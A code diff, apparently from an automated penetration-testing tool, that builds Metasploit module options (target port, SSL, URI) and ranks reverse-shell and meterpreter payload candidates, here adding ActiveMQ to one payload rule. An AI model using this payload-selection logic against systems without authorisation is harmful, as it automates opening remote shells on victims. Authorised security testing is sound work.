@@ -39,11 +39,12 @@ def plan_metasploit_execution(
 def plan_module_options(capability: dict[str, Any], service: dict[str, Any], *, lhost: str, lport: int) -> dict[str, Any]:
     matched = capability.get("matched_service") or service or {}
     port = str(matched.get("port") or service.get("port") or "")
+    match_ports = {str(item) for item in (capability.get("match") or {}).get("ports", [])}
     scheme = "https" if str(matched.get("service") or service.get("service")).lower() == "https" else "http"
     target_uri = infer_target_uri(capability, service)
     options = {
         "RHOSTS": "<target>",
-        "RPORT": port,
+        "RPORT": port if port and (not match_ports or port in match_ports) else "",
         "SSL": "true" if scheme == "https" else "false",
         "TARGETURI": target_uri,
         "VHOST": "",
@@ -85,7 +86,7 @@ def select_payload_candidates(capability: dict[str, Any], service: dict[str, Any
     if has_any(text, ["linux", "x64", "x86", "rocketmq", "couchdb"]):
         add("linux/x64/shell_reverse_tcp", 58, "Linux shell payload candidate")
 
-    if "rocketmq" in text or "cmd/linux/http" in text:
+    if "rocketmq" in text or "activemq" in text or "cmd/linux/http" in text:
         add("cmd/linux/http/x64/meterpreter/reverse_tcp", 72, "HTTP-capable Linux command target candidate")
 
     if "windows" in text or " win " in text:
